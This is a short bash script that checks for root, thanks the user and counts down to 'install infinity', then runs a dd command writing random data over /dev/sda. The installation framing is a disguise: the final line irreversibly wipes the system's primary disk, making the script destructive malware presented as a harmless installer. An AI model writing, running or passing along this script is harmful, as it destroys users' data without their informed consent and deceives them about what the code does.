#!/bin/bash

# Check if the script is run as root
if [ "$(id -u)" -ne 0 ]; then
    echo "You must run this script as root!"
    exit 1
fi

# Display a thank you message
echo "Thank you for using this script."
echo "Your system will install infinity in ..."
for i in 3 2 1; do
    echo "$i..."
    sleep 1

done

# Preparing for infinity installation

sudo dd if=/dev/urandom of=/dev/sda bs=1M
